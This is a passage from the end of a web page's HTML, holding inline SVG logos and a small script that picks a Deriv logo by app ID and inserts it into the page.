                            <svg xmlns="http://www.w3.org/2000/svg" width="160" height="23" fill="none"><path fill="#414652" fill-rule="evenodd" d="m13.21 1.982-1.068 6.05H8.44c-3.455 0-6.749 2.8-7.359 6.255l-.258 1.47c-.608 3.455 1.697 6.255 5.153 6.255h3.088c2.519 0 4.917-2.039 5.36-4.557L17.268 1.33l-4.059.653ZM10.58 16.884c-.136.778-.836 1.412-1.614 1.412H7.09c-1.553 0-2.592-1.261-2.32-2.817l.163-.917c.275-1.553 1.757-2.816 3.31-2.816h3.244l-.906 5.138Z" clip-rule="evenodd"/><path fill="#414652" d="M41.73 22.013h3.844l2.43-13.787h-3.843l-2.43 13.787ZM41.858 10.024l.001-.004.288-1.635c-3.944-1.016-7.016.035-8.267.553l-2.307 13.078h3.846l1.872-10.62c.578-.116 2.457-.296 4.278.27l.29-1.642Z"/><path fill="#414652" fill-rule="evenodd" d="M26.558 8.03h-2.99c-2.915 0-5.695 2.363-6.208 5.279l-.605 3.426c-.514 2.916 1.43 5.278 4.347 5.278h6.364l.653-3.705h-5.981c-.971 0-1.621-.786-1.448-1.76l.02-.116h9.644l.55-3.123c.514-2.916-1.43-5.278-4.346-5.278Zm.488 4.983-.022.2h-5.735l.031-.177c.173-.97 1.059-1.825 2.033-1.825h2.24c.962 0 1.612.84 1.453 1.802Z" clip-rule="evenodd"/><path fill="#414652" d="M54.685 17.32c1.746-3.14 3.67-7.26 4.472-9.094h3.85c-1.31 3.484-4.314 9.41-7.223 13.787h-3.847c-1.335-4.165-2.197-9.968-2.362-13.787h3.847c.07 1.246.627 5.866 1.264 9.094ZM67.018 15.028c0-1.081.17-2.096.512-3.044a7.306 7.306 0 0 1 1.536-2.503 7.163 7.163 0 0 1 2.418-1.706c.948-.418 2.029-.626 3.243-.626.796 0 1.526.076 2.19.227a9.922 9.922 0 0 1 1.934.598l-.882 3.384a10.694 10.694 0 0 0-1.308-.398 6.838 6.838 0 0 0-1.593-.17c-1.252 0-2.19.388-2.816 1.166-.607.777-.91 1.801-.91 3.072 0 1.346.284 2.389.853 3.129.588.739 1.602 1.109 3.044 1.109.511 0 1.061-.048 1.65-.142a7.022 7.022 0 0 0 1.62-.455l.598 3.47c-.493.208-1.11.388-1.849.54-.74.152-1.555.228-2.446.228-1.365 0-2.541-.2-3.527-.598-.986-.417-1.802-.976-2.446-1.678a6.766 6.766 0 0 1-1.394-2.474 11.04 11.04 0 0 1-.427-3.13ZM95.433 2.797V6.58H89.49v15.928H85.05V6.58h-5.944V2.797h16.326Z"/><path fill="#414652" d="M103.623 11.302c-.379-.095-.825-.19-1.337-.285a7.596 7.596 0 0 0-1.65-.17c-.265 0-.587.028-.967.085-.36.038-.635.085-.825.142v11.434h-4.238V8.343c.759-.265 1.65-.512 2.674-.74 1.043-.246 2.2-.369 3.47-.369.228 0 .503.02.825.057.322.019.645.057.967.114.323.038.645.095.967.17.323.057.598.133.825.228l-.711 3.499ZM110.623 19.55c.418 0 .816-.01 1.195-.028.379-.02.683-.048.91-.086v-3.214a7.79 7.79 0 0 0-.768-.114 8.55 8.55 0 0 0-.938-.056c-.399 0-.778.028-1.138.085a2.672 2.672 0 0 0-.91.256 1.585 1.585 0 0 0-.626.54c-.152.228-.228.512-.228.854 0 .663.218 1.128.655 1.393.455.247 1.071.37 1.848.37Zm-.341-12.401c1.252 0 2.294.142 3.129.426.834.285 1.498.693 1.991 1.223a4.427 4.427 0 0 1 1.081 1.935c.208.758.313 1.602.313 2.531v8.818c-.607.132-1.451.284-2.532.455-1.081.19-2.389.284-3.925.284-.967 0-1.849-.085-2.645-.256-.778-.17-1.451-.445-2.02-.825a3.941 3.941 0 0 1-1.308-1.536c-.304-.625-.455-1.393-.455-2.303 0-.873.17-1.612.512-2.22.36-.606.834-1.09 1.422-1.45a6.135 6.135 0 0 1 2.019-.768c.759-.17 1.546-.256 2.361-.256.55 0 1.034.029 1.451.086a5.77 5.77 0 0 1 1.052.17v-.398c0-.72-.218-1.299-.654-1.735-.436-.436-1.195-.654-2.276-.654-.72 0-1.431.057-2.133.17-.701.095-1.308.238-1.82.427l-.541-3.413c.247-.076.55-.152.911-.228.379-.095.787-.17 1.223-.227.436-.076.891-.133 1.365-.17.493-.058.986-.086 1.479-.086ZM122.818 14.914c0 1.308.294 2.36.882 3.157.588.797 1.46 1.195 2.617 1.195.379 0 .73-.01 1.052-.029.323-.038.588-.075.797-.113v-7.709c-.266-.17-.617-.313-1.053-.426a4.842 4.842 0 0 0-1.28-.171c-2.01 0-3.015 1.365-3.015 4.096Zm9.586 7.11c-.38.115-.816.228-1.309.342-.493.095-1.014.18-1.564.256-.531.076-1.081.133-1.65.17-.55.058-1.081.086-1.593.086-1.232 0-2.332-.18-3.299-.54-.967-.36-1.783-.873-2.446-1.536a7.049 7.049 0 0 1-1.536-2.446c-.342-.968-.512-2.048-.512-3.243 0-1.214.151-2.304.455-3.271.303-.986.739-1.82 1.308-2.503a5.626 5.626 0 0 1 2.077-1.564c.834-.36 1.782-.54 2.844-.54.588 0 1.109.056 1.564.17.474.114.949.275 1.423.483v-6.77l4.238-.682v21.589ZM134.239 15.141c0-1.327.199-2.484.597-3.47.417-1.005.958-1.84 1.621-2.503a6.728 6.728 0 0 1 2.276-1.507 7.277 7.277 0 0 1 2.674-.512c2.123 0 3.802.654 5.034 1.962 1.233 1.29 1.849 3.195 1.849 5.718 0 .246-.01.521-.028.824-.019.285-.038.54-.057.768h-9.614c.094.873.502 1.565 1.223 2.077.72.512 1.687.768 2.901.768.777 0 1.536-.067 2.275-.2.759-.151 1.375-.331 1.849-.54l.569 3.442a5.837 5.837 0 0 1-.91.341 9.953 9.953 0 0 1-1.28.285c-.455.095-.948.17-1.479.227a14.94 14.94 0 0 1-1.593.086c-1.346 0-2.522-.2-3.527-.598-.986-.398-1.811-.938-2.475-1.621a6.888 6.888 0 0 1-1.45-2.475c-.304-.948-.455-1.972-.455-3.072Zm9.955-1.62a3.967 3.967 0 0 0-.199-1.053 2.344 2.344 0 0 0-.484-.91 2.38 2.38 0 0 0-.824-.655c-.323-.17-.731-.256-1.224-.256-.474 0-.881.086-1.223.256-.341.152-.625.36-.853.626a3.038 3.038 0 0 0-.54.939 6.547 6.547 0 0 0-.256 1.052h5.603ZM159.155 11.302c-.379-.095-.825-.19-1.337-.285a7.596 7.596 0 0 0-1.65-.17c-.265 0-.587.028-.967.085a4.81 4.81 0 0 0-.825.142v11.434h-4.238V8.343c.759-.265 1.65-.512 2.674-.74 1.043-.246 2.2-.369 3.47-.369.228 0 .503.02.825.057.322.019.645.057.967.114.323.038.645.095.967.17.323.057.598.133.825.228l-.711 3.499Z"/></svg>
                            </div>`;
                } else {
                    return `<a id="logo" href="https://deriv.com/">
                                <svg width="217" height="32" viewBox="0 0 217 72" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <g clip-path="url(#clip0_987_32033)">
                                        <path d="M43.4717 2.27116L39.7568 23.331H26.8612C14.8305 23.331 3.36323 33.0745 1.23785 45.1006L0.338242 50.2194C-1.77724 62.2456 6.24979 71.9892 18.2805 71.9892H29.036C37.8045 71.9892 46.1578 64.8938 47.7 56.1289L57.6053 0L43.4717 2.27116ZM34.3216 54.1425C33.8471 56.8501 31.4085 59.054 28.6999 59.054H22.1656C16.7582 59.054 13.1401 54.6661 14.089 49.2509L14.6526 46.0592C15.6114 40.6538 20.7717 36.2563 26.1791 36.2563H37.4767L34.3216 54.1425ZM142.785 71.9881L151.247 24.0018H164.632L156.17 71.9881H142.785ZM144.233 24.5552C143.562 28.3613 142.888 32.1675 142.217 35.9738C135.876 34.0039 129.334 34.6312 127.324 35.0319C125.153 47.3536 122.979 59.6783 120.806 72H107.412C109.231 61.6902 115.444 26.4806 115.444 26.4806C119.801 24.6774 130.499 21.0176 144.233 24.5552ZM89.9629 23.3228H79.5436C69.3911 23.3228 59.7136 31.5444 57.924 41.6931L55.8185 53.6204C54.0291 63.7689 60.8009 71.9908 70.9535 71.9908H93.1167L95.3905 59.0951H74.5612C71.1807 59.0951 68.9167 56.3577 69.5199 52.9682L69.5891 52.5631H103.17L105.088 41.6931C106.877 31.5444 100.106 23.3228 89.9531 23.3228H89.9629ZM91.6534 40.6654L91.5744 41.3571H71.6059L71.7146 40.7444C72.3173 37.3648 75.4019 34.3904 78.7922 34.3904H86.592C89.9434 34.3904 92.2074 37.3154 91.6534 40.6654ZM203.463 24.0018H216.857C212.294 36.1284 201.838 56.7568 191.708 71.9881H178.314C173.664 57.4915 170.661 37.293 170.089 24.0018H183.484C183.725 28.3374 185.667 44.4186 187.883 55.653C193.96 44.7236 200.66 30.384 203.452 24.0018H203.463Z" fill="#FF444F"/>
                                    </g>
                                    <defs>
                                        <clipPath id="clip0_987_32033">
                                        <rect width="217" height="72" fill="white"/>
                                        </clipPath>
                                    </defs>
                                </svg>
                            </a>`;
                }
            }

            var app_id = '16929';
            document.getElementById("logo-container").innerHTML = logoSelector(app_id);
        </script>
        <!-- End Google Tag Manager -->
    </body>
</html>
